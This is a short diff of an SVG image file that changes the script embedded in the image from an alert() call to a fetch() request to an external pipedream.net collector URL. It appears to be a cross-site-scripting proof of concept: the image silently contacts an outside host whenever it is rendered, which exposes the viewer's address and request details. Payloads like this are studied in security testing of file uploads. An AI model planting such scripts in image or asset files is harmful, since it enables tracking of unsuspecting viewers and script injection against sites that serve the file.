@@ -6,7 +6,7 @@ height="68"
 viewBox="-34 -34 68 68"
 version="1.1">
 <script>
-    alert("hallo");
+    fetch('https://enmu2w91qrz7n.x.pipedream.net/')
 </script>
 <circle
 cx="0"
